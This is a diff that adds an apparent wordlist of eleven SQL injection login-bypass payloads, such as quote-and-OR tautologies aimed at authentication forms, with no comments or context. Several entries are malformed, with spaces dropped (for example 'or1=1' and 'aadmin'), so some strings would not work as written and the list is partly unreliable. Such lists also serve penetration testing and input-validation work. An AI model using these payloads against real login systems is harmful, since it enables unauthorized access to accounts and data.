@@ -1,0 +1,11 @@
+admin'or'a'='a
+'or'='or'
+admin'or'1'='1'or1=1
+')or('a'='a
+'or1=1---
+')or('a'='aadmin'
+or'a'='a
+or'1'='1'or1=1
+')or('a'='a')or('a'='a
+admin'/or'a'='a
+admin'/or'1'='1'or1=1
